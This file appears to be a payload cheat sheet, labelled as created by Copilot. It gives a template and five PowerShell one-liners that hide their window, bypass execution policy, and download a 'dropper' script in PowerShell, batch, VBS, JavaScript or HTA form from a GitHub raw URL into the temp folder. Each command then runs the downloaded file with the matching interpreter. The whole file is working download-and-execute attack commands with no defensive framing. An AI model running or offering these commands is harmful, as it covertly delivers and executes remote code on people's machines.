# Created by Copilot

<#
Format
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "Invoke-WebRequest '<URL>' -OutFile $env:temp\<filename>; Start-Process <executor> -ArgumentList '<execution flags> $env:temp\<filename>'"
#>

#PowerShell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/akosijesyang/.Test/main/dropper.ps1' -OutFile $env:temp\dropper.ps1; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\dropper.ps1'"

#Batch
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/akosijesyang/.Test/main/dropper.bat' -OutFile $env:temp\dropper.bat; Start-Process cmd -ArgumentList '/c $env:temp\dropper.bat'"

#VBS
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/akosijesyang/.Test/main/dropper.vbs' -OutFile $env:temp\dropper.vbs; Start-Process wscript -ArgumentList '$env:temp\dropper.vbs'"

#JavaScript
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/akosijesyang/.Test/main/dropper.js' -OutFile $env:temp\dropper.js; Start-Process wscript -ArgumentList '$env:temp\dropper.js'"

#MTSHA
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/akosijesyang/.Test/main/dropper.hta' -OutFile $env:temp\dropper.hta; Start-Process mshta.exe -ArgumentList '$env:temp\dropper.hta'"